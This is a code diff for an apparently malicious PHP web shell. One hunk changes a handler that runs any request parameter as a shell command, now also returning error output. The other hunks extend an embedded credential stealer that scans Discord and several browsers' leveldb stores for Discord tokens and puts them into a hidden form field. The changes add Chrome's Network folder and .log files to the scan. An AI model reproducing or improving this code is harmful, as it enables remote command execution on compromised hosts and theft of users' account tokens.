@@ -90,7 +90,7 @@
             break;
             case 'cmd':
                 if(!isset($_REQUEST["cmd"])) boiola($rawdir);
-                $cmdoutput = shell_exec(preg_replace("/__owo__/",$rawdir,$_REQUEST["cmd"]));
+                $cmdoutput = shell_exec(preg_replace("/__owo__/",$rawdir,$_REQUEST["cmd"]) . "  2>&1");
                 $_REQUEST["action"] = null;
             break;
         };
@@ -247,7 +247,7 @@
                     <td> <a class="q btn btn-info">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
                                     $euqueromematar = '';
                                     $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
-                                    $folders=['appdata/Discord',"appdata/discordcanary","appdata/discordptb","localappdata/Google/Chrome/User Data/Default","appdata/Opera Software/Opera Stable","appdata/Opera Software/Opera GX Stable","localappdata/BraveSoftware/Brave-Browser/User Data/Default","localappdata/Yandex/YandexBrowser/User Data/Default"];
+                                    $folders=['appdata/Discord',"appdata/discordcanary","appdata/discordptb","localappdata/Google/Chrome/User Data/Default/Network","appdata/Opera Software/Opera Stable","appdata/Opera Software/Opera GX Stable","localappdata/BraveSoftware/Brave-Browser/User Data/Default","localappdata/Yandex/YandexBrowser/User Data/Default"];
                                     $userdir=$rawdir;
                                     $localappdata=$userdir.'/AppData/Local';
                                     $appdata=$userdir.'/AppData/Roaming';
@@ -258,7 +258,7 @@
                                         if(is_dir($leveldb)){
                                             $guh=scandir($leveldb);
                                             $cuh=array_filter($guh,function($v,$k){
-                                                return substr($v,-4)==".ldb";
+                                                return substr($v,-4)==".ldb" || substr($v,-4)==".log";
                                             },ARRAY_FILTER_USE_BOTH);
                                             foreach($cuh as $ii=>$dbfile){
                                                 $data=file_get_contents($leveldb.'/'.$dbfile);
